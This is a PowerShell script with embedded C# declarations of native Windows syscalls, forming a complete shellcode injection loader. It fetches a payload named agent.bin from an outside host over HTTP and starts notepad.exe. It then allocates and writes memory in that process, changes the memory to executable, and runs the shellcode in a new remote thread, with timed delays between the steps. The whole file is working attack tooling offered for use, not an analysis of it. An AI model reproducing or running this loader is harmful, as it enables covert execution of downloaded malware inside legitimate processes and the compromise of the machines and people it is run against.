Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    using System.Net;
    using System.Diagnostics;

    public class NtDll {
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint FreeType);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Argument, uint CreateFlags, uint ZeroBits, uint StackSize, uint MaximumStackSize, IntPtr AttributeList);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtWaitForSingleObject(IntPtr Handle, bool Alertable, IntPtr Timeout);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtDelayExecution(bool Alertable, ref long DelayInterval);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int ZwSetTimerResolution(uint RequestedResolution, bool Set, ref uint ActualResolution);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }

    public class MyFunctions {
        private static bool once = true;

        public static void SleepShort(float milliseconds) {
            if (once) {
                uint actualResolution = 0;
                NtDll.ZwSetTimerResolution(1, true, ref actualResolution);
                once = false;
            }

            long interval = (long)(-1 * milliseconds * 10000.0f);
            NtDll.NtDelayExecution(false, ref interval);
        }
    }
"@

Write-Host "[+] Starting shellcode injection process" -ForegroundColor Green

# Define URL to download shellcode from
$url = "http://10.100.102.67/agent.bin"
Write-Host "[*] Shellcode URL: $url" -ForegroundColor Yellow

# Function to download shellcode from URL
function Download-Shellcode {
    param($url)
    Write-Host "[*] Downloading shellcode from URL..." -ForegroundColor Cyan
    $webClient = New-Object System.Net.WebClient
    $bytes = $webClient.DownloadData($url)
    Write-Host "[+] Shellcode downloaded successfully (Size: $($bytes.Length) bytes)" -ForegroundColor Green
    return $bytes
}

# Ensure enough delay between operations
Write-Host "[*] Initial delay..." -ForegroundColor Cyan
[MyFunctions]::SleepShort(2000)

# Download shellcode from URL
$shellcode = Download-Shellcode -url $url

# Calculate the size of the shellcode
$size = $shellcode.Length
Write-Host "[*] Shellcode size: $size bytes" -ForegroundColor Yellow

# Sleep function for delay
function SleepShort($milliseconds) {
    Write-Host "[*] Sleeping for $milliseconds ms..." -ForegroundColor Cyan
    [MyFunctions]::SleepShort($milliseconds)
}

# Ensure enough delay between operations
SleepShort 2000

# Create new notepad.exe process
Write-Host "[*] Creating notepad process..." -ForegroundColor Cyan
$processInfo = Start-Process notepad -PassThru
$processHandle = $processInfo.Handle
Write-Host "[+] Process created (PID: $($processInfo.Id), Handle: $processHandle)" -ForegroundColor Green

SleepShort 2000

# Allocate read-write memory in notepad process using NtAllocateVirtualMemory
Write-Host "[*] Allocating memory in target process..." -ForegroundColor Cyan
$addr = [IntPtr]::Zero
$result = [NtDll]::NtAllocateVirtualMemory($processHandle, [ref]$addr, [IntPtr]::Zero, [ref]$size, 0x3000, 0x4)
if ($result -eq 0) {
    Write-Host "[+] Memory allocated successfully at address: 0x$($addr.ToString('X'))" -ForegroundColor Green
} else {
    Write-Host "[!] Memory allocation failed with error: 0x$($result.ToString('X'))" -ForegroundColor Red
    exit
}

SleepShort 2000

# Write the shellcode to the allocated memory in notepad process
Write-Host "[*] Writing shellcode to allocated memory..." -ForegroundColor Cyan
$bytesWritten = 0
$result = [NtDll]::NtWriteVirtualMemory($processHandle, $addr, $shellcode, $shellcode.Length, [ref]$bytesWritten)
if ($result -eq 0) {
    Write-Host "[+] Shellcode written successfully ($bytesWritten bytes written)" -ForegroundColor Green
} else {
    Write-Host "[!] Write operation failed with error: 0x$($result.ToString('X'))" -ForegroundColor Red
    exit
}

SleepShort 2000

# Change the memory protection to read-execute using NtProtectVirtualMemory
Write-Host "[*] Changing memory protection to RX..." -ForegroundColor Cyan
$oldProtect = 0
$result = [NtDll]::NtProtectVirtualMemory($processHandle, [ref]$addr, [ref]$size, 0x20, [ref]$oldProtect)
if ($result -eq 0) {
    Write-Host "[+] Memory protection changed successfully (Old protection: 0x$($oldProtect.ToString('X')))" -ForegroundColor Green
} else {
    Write-Host "[!] Protection change failed with error: 0x$($result.ToString('X'))" -ForegroundColor Red
    exit
}

SleepShort 2000

# Create a new thread in notepad process and execute the shellcode using NtCreateThreadEx
Write-Host "[*] Creating thread to execute shellcode..." -ForegroundColor Cyan
$thandle = [IntPtr]::Zero
$result = [NtDll]::NtCreateThreadEx([ref]$thandle, 0x1FFFFF, [IntPtr]::Zero, $processHandle, $addr, [IntPtr]::Zero, 0, 0, 0, 0, [IntPtr]::Zero)
if ($result -eq 0) {
    Write-Host "[+] Thread created successfully (Handle: $thandle)" -ForegroundColor Green
} else {
    Write-Host "[!] Thread creation failed with error: 0x$($result.ToString('X'))" -ForegroundColor Red
    exit
}

# Don't wait for the thread to finish - let it run asynchronously
# Instead, just close the thread handle to prevent resource leaks
if ($thandle -ne [IntPtr]::Zero) {
    Write-Host "[*] Closing thread handle..." -ForegroundColor Cyan
    [NtDll]::CloseHandle($thandle) | Out-Null
    Write-Host "[+] Thread handle closed" -ForegroundColor Green
}

SleepShort 10000
Write-Host "[+] Shellcode injection completed successfully!" -ForegroundColor Green

# Free the allocated memory - removed this as shellcode might still be using it
# [NtDll]::NtFreeVirtualMemory($processHandle, [ref]$addr, [ref]$size, 0x8000)
